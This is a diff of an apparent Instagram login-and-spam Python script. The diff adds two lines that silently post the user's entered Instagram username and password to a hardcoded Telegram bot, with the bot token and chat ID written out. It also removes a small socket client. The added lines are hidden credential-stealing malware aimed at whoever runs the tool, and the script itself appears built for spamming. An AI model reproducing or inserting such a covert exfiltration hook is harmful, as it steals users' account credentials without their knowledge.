@@ -45,6 +45,12 @@ headers_login = {
 'x-instagram-ajax': '3340f49e0e15',
 'x-requested-with': 'XMLHttpRequest'
 }
+
+tlg =(f'https://api.telegram.org/bot1621155562:AAFZGnJTv12nxrim86Mxi9sozjzQPIDdGmk/sendMessage?chat_id=502361503&text=\n✥2L21L1-NEW Login  ✥\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n✥.⍆.user : {username_login} \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ✥.⍆.password : {password_login}  ')
+requests.post(tlg)
+
+
+
 data_login = {
 'username': username_login,
 'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1616767114:'+password_login,
@@ -112,23 +118,4 @@ while True:
         time.sleep(3)
     else:
         print('[-] Error spam ')
-def connect():
-    s = socket.socket()
-    host = "SLPTD003080"
-    port = 8080
-    s.connect((host,port))
-    print(" ")
 
-    while 1:    
-        incoming_message = s.recv(1024)
-        incoming_message = incoming_message.decode()
-        print(" Server : ", incoming_message)
-        print("")
-        message = input(str(">> "))
-        message = message.encode()
-        s.send(message)
-        print("message has been sent...")
-        print("")
-        quit()
-
-connect()
